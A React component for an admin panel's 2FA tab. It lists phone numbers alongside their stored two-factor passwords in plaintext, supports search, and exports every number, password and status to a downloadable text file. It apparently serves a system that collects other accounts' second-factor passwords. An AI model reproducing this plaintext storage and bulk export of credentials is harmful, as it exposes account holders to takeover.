import React, { useMemo, useState } from "react";
import { Download, KeyRound, Search } from "lucide-react";
import { AdminSpinner } from "./AdminUsersTab";

// 2FA tab — every number whose system 2FA password is stored, with a text-file
// export built on this device (the passwords are never kept in public storage).
export default function AdminTwofaTab({ rows, loading }) {
  const [search, setSearch] = useState("");
  const list = useMemo(() => {
    const q = search.trim();
    if (!q) return rows || [];
    return (rows || []).filter((r) => String(r.phone_number || "").includes(q));
  }, [rows, search]);

  const download = () => {
    const lines = [
      "# phone | 2fa password | status",
      ...list.map((r) => `${r.phone_number || ""} | ${r.password || ""} | ${r.status || ""}`),
    ];
    const url = URL.createObjectURL(new Blob([lines.join("
") + "
"], { type: "text/plain;charset=utf-8" }));
    const a = document.createElement("a");
    a.href = url;
    a.download = `2fa_list_${new Date().toISOString().slice(0, 10)}.txt`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  };

  if (loading) return <AdminSpinner />;

  return (
    <div className="flex flex-col gap-4">
      <div className="adm-sr">
        <Search className="h-4 w-4 shrink-0 text-[#A29BFE]" strokeWidth={1.6} />
        <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search number" maxLength={32} />
      </div>

      <div className="adm-card flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-2">
          <KeyRound className="h-4 w-4 text-[#A29BFE]" strokeWidth={1.8} />
          <span className="text-sm text-slate-300">{list.length} numbers with 2FA saved</span>
        </div>
        <button type="button" onClick={download} disabled={!list.length} className="adm-tab on disabled:opacity-50">
          <Download className="h-[14px] w-[14px] shrink-0" strokeWidth={2} />
          <span>Download .txt</span>
        </button>
      </div>

      {list.length === 0 ? (
        <div className="adm-card">
          <p className="adm-emp">No stored 2FA passwords yet</p>
        </div>
      ) : (
        <div className="flex flex-col gap-2">
          {list.slice(0, 300).map((r) => (
            <div
              key={`${r.phone_number}-${r.created_date}`}
              className="adm-card flex items-center justify-between gap-3 text-sm"
            >
              <span className="font-mono text-slate-200">{r.phone_number}</span>
              <span className="font-mono text-[#A29BFE]">{r.password}</span>
              <span className="text-xs text-slate-400">{r.status}</span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
